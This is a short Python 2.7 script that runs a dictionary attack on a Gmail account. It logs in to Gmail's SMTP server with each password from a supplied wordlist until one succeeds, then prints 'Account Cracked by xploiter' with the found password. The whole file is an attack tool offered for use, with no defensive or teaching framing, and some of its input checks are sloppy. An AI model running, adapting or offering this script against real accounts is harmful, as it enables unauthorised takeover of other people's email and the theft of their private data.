#!/usr/bin/python2.7

import smtplib
import sys
import os.path
import re


smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

if len(sys.argv) != 3:
    sys.exit('usage gmail example@gmail.com dictionary')

email = sys.argv[1]

regex = re.match("(\w+)@(\w+)\.[net|com]", email)

if regex:
     regex = True
else:
    sys.exit('error not valid email...')

dictionary = sys.argv[2]
extension = os.path.splitext(dictionary)[1]

if extension == ".txt":
    extension = True
else:
    sys.exit('this not a .txt extension..')
if email and extension == True:
    dictionary = open(dictionary, "r")
for password in dictionary:
        try:
                smtpserver.login(email, password)

                print ("Account Cracked by xploiter: %s" % password);
                break; 
        except smtplib.SMTPAuthenticationError:
                print "Password Incorrect: %s" % password
